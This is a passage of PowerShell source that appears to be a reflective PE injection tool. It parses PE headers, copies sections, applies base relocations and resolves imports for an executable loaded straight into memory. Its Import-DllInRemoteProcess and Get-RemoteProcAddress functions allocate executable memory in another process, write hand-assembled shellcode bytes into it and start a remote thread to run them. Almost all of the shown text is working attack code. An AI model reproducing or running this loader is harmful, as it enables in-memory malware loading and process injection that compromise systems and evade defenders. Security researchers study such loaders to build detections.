            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }
        return $PEInfo
    }
    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }
        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") 
        [IntPtr]$DllAddress = [IntPtr]::Zero
        if ($PEInfo.PE64Bit -eq $true)
        {
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem
            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)
            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }
            $RThreadHandle = Invoke-CreateRemoteThread -ProcHandle $RemoteProcHandle -FirstAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcHandle $RemoteProcHandle -FirstAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }
            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        return $DllAddress
    }
    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,
        [Parameter(Position=2, Mandatory=$true)]
        [String]
        $FunctionName
        )
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        $FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
        $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
        $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RFuncNamePtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }
        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($FunctionNameSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") 
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem
        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "Unable to write shellcode to remote process memory."
        }
        $RThreadHandle = Invoke-CreateRemoteThread -ProcHandle $RemoteProcHandle -FirstAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        return $ProcAddress
    }
    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PortableExecutableBytes,
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
            $SizeOfRawData = $SectionHeader.SizeOfRawData
            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }
            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }
            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -FirstAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PortableExecutableBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$FirstAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -FirstAddress $FirstAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($FirstAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }
    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        [Int64]$BaseDifference = 0
        $AddDifference = $true 
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }
        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)
            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }
            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }
            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }
    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }
                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                }
                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) 
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $ProcedureName = ''
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([Int64]$OriginalThunkRefVal -lt 0)
                    {
                        $ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff 
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                    }
                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
                    }
                    else
                    {
                        if($ProcedureName -is [string])
                        {
                            [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
                        }
                        else
                        {
                            [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressOrdinal.Invoke($ImportDllHandle, $ProcedureName)
                        }
                    }
                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                    }
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                }
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }
    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )
        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }
        return $ProtectionFlag
    }
    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize
            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -FirstAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        [Parameter(Position = 2, Mandatory = $true)]
